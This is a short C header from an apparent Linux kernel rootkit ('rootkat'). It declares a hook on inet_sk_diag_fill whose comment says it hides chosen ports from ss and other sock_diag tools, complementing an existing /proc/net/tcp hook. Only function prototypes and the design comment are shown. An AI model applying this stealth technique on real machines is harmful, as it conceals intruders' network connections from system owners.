/* SPDX-License-Identifier: MIT */
#ifndef ROOTKAT_HOOK_INET_SK_DIAG_FILL_H
#define ROOTKAT_HOOK_INET_SK_DIAG_FILL_H

/*
 * inet_sk_diag_fill hook — closes the ss(8) bypass.
 *
 * /proc/net/tcp{,6} reads go through tcp[46]_seq_show (already hooked).
 * `ss` and other sock_diag clients go through NETLINK_SOCK_DIAG → the
 * inet_diag dump path → inet_sk_diag_fill per socket. Hooking that fill
 * lets us hide the same hidden_ports across both surfaces.
 *
 * Family-agnostic: covers IPv4 and IPv6 in one hook.
 */
int rootkat_hook_inet_sk_diag_fill_install(void);
void rootkat_hook_inet_sk_diag_fill_remove(void);

#endif
